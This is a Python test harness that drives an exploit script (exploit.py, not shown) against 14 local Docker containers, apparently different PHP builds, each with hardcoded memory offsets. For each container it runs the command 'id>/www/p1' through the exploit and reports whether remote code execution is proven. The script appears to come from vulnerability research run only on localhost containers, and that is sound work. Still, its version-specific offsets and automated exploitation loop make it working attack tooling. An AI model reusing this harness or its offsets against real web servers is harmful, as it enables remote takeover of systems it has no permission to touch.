import os
import subprocess, sys, time
BASE = os.path.dirname(os.path.abspath(__file__))
VERS = [
    ("p2s5445", "18101", "0x2f2e20", "0x3cd750"),
    ("p2s5538", "18102", "0x357e70", "0x438b80"),
    ("p2s5640", "18103", "0x378e80", "0x466920"),
    ("p2s7033", "18104", "0x3948d0", "0x47b7b0"),
    ("p2s7133", "18105", "0x300420", "0x3e6f60"),
    ("p2s7234", "18106", "0x3624e0", "0x451010"),
    ("p2s7333", "18107", "0x35f640", "0x440dc0"),
    ("p2s7433", "18108", "0x335850", "0x417d60"),
    ("p2s8030", "18109", "0x3495d0", "0x4319a0"),
    ("p2s8132", "18110", "0x36b080", "0x450690"),
    ("p2s8234", "18111", "0x39b8a0", "0x487650"),
    ("p2s8335", "18112", "0x3ac080", "0x49ec50"),
    ("p2s8426", "18113", "0x465370", "0x65eb60"),
    ("p2s8511", "18114", "0x5996e0", "0x7b47a0"),
]

def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

def one(c, port, zif, dtor):
    sh(f'docker exec {c} rm -f /www/p1 2>/dev/null')
    sh(f'docker restart {c}')
    time.sleep(3.0)
    # let the single worker settle and free any residual memory
    cmd = ["python", BASE + r"\exploit.py",
           "-u", f"http://127.0.0.1:{port}/index.php",
           "--profile", "bookworm",
           "--zif-offset", zif, "--dtor-offset", dtor,
           "--retries", "6",
           "-c", "id>/www/p1", "--fetch", "/p1"]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=420)
        out = (r.stdout or "") + (r.stderr or "")
    except subprocess.TimeoutExpired:
        out = "TIMEOUT"
    proof_ok = "uid=33" in out
    proof = ""
    if proof_ok:
        proof = sh(f'docker exec {c} cat /www/p1').stdout.strip()
    stage = "unknown"
    for line in out.splitlines():
        if "stage 1" in line and "attempt" in line:
            stage = "stage1"
        elif "stage 2" in line and "attempt" in line:
            stage = "stage2"
        elif "stage 3" in line and "attempt" in line:
            stage = "stage3"
    return c, stage, proof_ok, proof, out

def main():
    only = sys.argv[1:] if len(sys.argv) > 1 else None
    results = {}
    for c, port, zif, dtor in VERS:
        if only and c not in only:
            continue
        print(f"=== {c} ({port}) ===", flush=True)
        c2, stage, proof_ok, proof, out = one(c, port, zif, dtor)
        results[c] = (stage, proof_ok, proof)
        if proof_ok:
            print(f"    *** RCE PROVEN *** proof: {proof[:60]}", flush=True)
        else:
            last = [l for l in out.splitlines() if any(k in l for k in ("stage","HEAP","libphp","FAIL","PROOF","uid=","chunk","W3"))][-3:]
            print(f"    no RCE (reached: {stage})", flush=True)
            for l in last:
                print(f"      {l.strip()[:100]}", flush=True)
    print("=" * 60)
    ok = [c for c, v in results.items() if v[1]]
    print(f"RCE proven ({len(ok)}/{len(VERS)}): {', '.join(ok)}")

if __name__ == "__main__":
    main()
